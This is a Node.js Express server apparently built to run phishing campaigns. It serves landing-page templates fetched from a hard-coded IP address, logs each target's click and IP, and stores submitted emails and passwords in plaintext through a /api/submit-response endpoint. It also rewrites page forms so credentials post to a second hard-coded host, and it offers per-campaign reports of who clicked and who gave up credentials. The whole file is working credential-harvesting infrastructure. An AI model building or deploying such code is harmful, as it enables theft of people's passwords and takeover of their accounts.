const express = require('express');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');
const fetch = require('node-fetch');
const cors = require('cors');
const { 
  logLinkClick, 
  getAllResponses, 
  getResponsesByCampaign, 
  updateResponseWithFormData 
} = require('./db/queries');

// Load environment variables
dotenv.config();

// Initialize Express app
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ================== API ENDPOINTS ==================

// Get all responses
app.get('/api/responses', async (req, res) => {
  try {
    const results = await getAllResponses();
    res.json(results);
  } catch (error) {
    console.error('Error fetching responses:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get responses for a specific campaign
app.get('/api/responses/campaign/:campaignId', async (req, res) => {
  try {
    const { campaignId } = req.params;
    const numCampaignId = parseInt(campaignId, 10);
    
    if (isNaN(numCampaignId)) {
      return res.status(400).json({ error: 'Invalid campaign ID' });
    }
    
    const results = await getResponsesByCampaign(numCampaignId);
    res.json(results);
  } catch (error) {
    console.error('Error fetching responses by campaign ID:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/reports/campaign/:campaignId', async (req, res) => {
  try {
    const { campaignId } = req.params;
    const numCampaignId = parseInt(campaignId, 10);
    
    if (isNaN(numCampaignId)) {
      return res.status(400).json({ error: 'Invalid campaign ID' });
    }
    
    const allResponses = await getResponsesByCampaign(numCampaignId);
    
    const processedResponses = processUniqueUserResponses(allResponses);
    
    res.json({
      campaignId: numCampaignId,
      totalResponses: allResponses.length,
      uniqueUsers: Object.keys(processedResponses.userMap).length,
      reportData: processedResponses.uniqueResponses
    });
  } catch (error) {
    console.error('Error generating campaign report:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Handle form submissions
app.post('/api/submit-response', async (req, res) => {
  const { email, password } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  try {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const responseText = `email: ${email}, password: ${password}`;
    
    const responseId = await updateResponseWithFormData(ip, responseText);
    
    if (!responseId) {
      return res.status(404).send('No matching response entry found for this IP.');
    }
    
    res.send('Response details captured successfully.');
  } catch (error) {
    console.error('Error processing form submission:', error);
    res.status(500).send('Internal Server Error');
  }
});

// ================== LANDING PAGE ROUTE ==================

app.get('/:campaignId/:userId/:landingPageId', async (req, res) => {
  const { campaignId, userId, landingPageId } = req.params;
  
  try {
    // Parse and validate parameters
    const numCampaignId = parseInt(campaignId, 10);
    const numUserId = parseInt(userId, 10);
    const numLandingPageId = parseInt(landingPageId, 10);
    
    if (isNaN(numCampaignId) || isNaN(numUserId) || isNaN(numLandingPageId)) {
      return res.status(400).send('Invalid parameters in URL');
    }
    
    // Fetch landing page template
    const resourceUrl = `http://82.112.238.250:9000/landingPageTemplate/ID/${numLandingPageId}`;
    const response = await fetch(resourceUrl);
    
    if (!response.ok) {
      throw new Error(`Failed to fetch template: ${response.status} ${response.statusText}`);
    }
    
    const responseText = await response.text();
    
    // Process template - decode from Base64 if needed
    let outputHTML = responseText;
    try {
      const jsonData = JSON.parse(responseText);
      if (jsonData.code) {
        outputHTML = Buffer.from(jsonData.code, 'base64').toString('utf8');
        outputHTML = decodeHtmlEntities(outputHTML);
      }
    } catch (e) {
      console.log('Template is not in JSON format or parsing failed');
    }
    
    // Log the link click in the database
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    await logLinkClick(numCampaignId, numUserId, numLandingPageId, ip);
    
    // Fix form submission URL
    outputHTML = outputHTML.replace(
      `fetch('http://147.93.111.204:3000/submit-response'`,
      `fetch('http://147.93.111.204:3000/api/submit-response'`
    );
    
    // Serve the landing page
    res.set('Content-Type', 'text/html');
    res.send(outputHTML);
  } catch (error) {
    console.error('Error processing landing page request:', error);
    res.status(500).send('Internal server error');
  }
});

// ================== UTILITIES ==================

function decodeHtmlEntities(text) {
  // First decode HTML entities
  let result = text
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&')
    .replace(/&nbsp;/g, ' ');
  
  // Now remove paragraph tags that are wrapping HTML elements
  // This pattern looks for paragraph tags with HTML content inside
  result = result.replace(/<p>(.*?)<\/p>/g, '$1');
  
  return result;
}
function processUniqueUserResponses(responses) {
  const userResponseMap = {};
  
  const sortedResponses = [...responses].sort((a, b) => 
    new Date(b.created_at) - new Date(a.created_at)
  );
  
  sortedResponses.forEach(response => {
    const userId = response.user_id;
    const type = response.response_text ? 'submission' : 'click';
    
    if (!userResponseMap[userId]) {
      userResponseMap[userId] = {};
    }
    
    if (!userResponseMap[userId][type]) {
      userResponseMap[userId][type] = response;
    }
  });
  
  const uniqueResponses = [];
  
  Object.values(userResponseMap).forEach(userInteractions => {
    if (userInteractions.submission) {
      uniqueResponses.push(userInteractions.submission);
    }
    
    if (userInteractions.click) {
      uniqueResponses.push(userInteractions.click);
    }
  });
  
  uniqueResponses.sort((a, b) => a.user_id - b.user_id);
  
  return {
    userMap: userResponseMap,
    uniqueResponses: uniqueResponses
  };
}

// Start server
app.listen(port, () => {
  console.log(`Campaign-server running on port ${port}`);
});